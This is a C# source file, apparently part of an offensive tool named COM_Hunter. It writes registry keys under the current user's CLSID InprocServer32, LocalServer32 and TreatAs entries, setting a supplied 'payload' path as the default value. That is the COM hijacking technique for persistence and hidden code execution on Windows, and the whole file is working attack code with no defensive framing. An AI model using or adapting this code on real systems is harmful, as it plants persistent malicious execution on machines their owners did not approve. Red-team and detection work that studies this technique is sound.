﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace COM_Hunter
{
    internal class Build
    {
        // BuildRegistryKey method
        public static (string inprocServer, string localServer) BuildRegistryKey(string clsid)
        {
            // Remove any existing curly braces and add them back to ensure consistent format
            clsid = clsid.Trim().Replace("{", "").Replace("}", "");
            clsid = $"{{{clsid}}}";

            string inprocServer = $"SOFTWARE\\Classes\\CLSID\\{clsid}\\InprocServer32";
            string localServer = $"SOFTWARE\\Classes\\CLSID\\{clsid}\\LocalServer32";

            return (inprocServer, localServer);
        }

        // CreateRegistryCU method
        public static void CreateRegistryCU(string regisrtyKey, string payload)
        {
            string computerVar = "Computer";
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).CreateSubKey(regisrtyKey, true))
                {
                    key.SetValue("", payload);
                    key.SetValue("ThreadingModel", "Both");
                    // Call method named SuccessMessage
                    Info.SuccessMessage();
                    Console.WriteLine($"[+] Registry Key Path: {computerVar}\\{key}");
                    Console.WriteLine($"[+] Registry Key Value: {payload}\n");
                    key.Close();
                } 
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[!] Error creating registry key: {ex.Message}\n");
                Settings.ExitCodeMethod(Settings.exitCodeError);
            }
        }

        // CreateTreatAsRegistryCU method
        public static void CreateTreatAsRegistryCU(string regisrtyKey, string payload)
        {
            string computerVar = "Computer";
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).CreateSubKey(regisrtyKey, true))
                {
                    key.SetValue("", payload);
                    // Call method named SuccessMessage
                    Info.SuccessMessage();
                    Console.WriteLine($"[+] Registry Key Path: {computerVar}\\{key}");
                    Console.WriteLine($"[+] Registry Key Value: {payload}\n");
                    key.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[!] Error creating registry key: {ex.Message}\n");
                Settings.ExitCodeMethod(Settings.exitCodeError);
            }
        }

        // TrimClsid method
        public static string TrimClsid(string clsid)
        {
            // Remove any existing curly braces and add them back to ensure consistent format
            clsid = clsid.Trim().Replace("{", "").Replace("}", "");

            // Check if the CLSID is in the correct format
            if (Check.CheckCLSIDFormat(clsid))
            { 
                clsid = $"{{{clsid}}}";
            }else{
                Console.WriteLine("[!] Invalid CLSID format!\n\n[!] The expected CLSID format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n");
                Settings.ExitCodeMethod(Settings.exitCodeError);
            }

            return clsid;
        }

        // BuildTreatAsKey method
        public static string  BuildTreatAsKey(string clsid)
        {
            // Remove any existing curly braces and add them back to ensure consistent format
            clsid = clsid.Trim().Replace("{", "").Replace("}", "");
            clsid = $"{{{clsid}}}";

            string treatAs = $"SOFTWARE\\Classes\\CLSID\\{clsid}\\TreatAs";

            return treatAs;
        }
    }
}
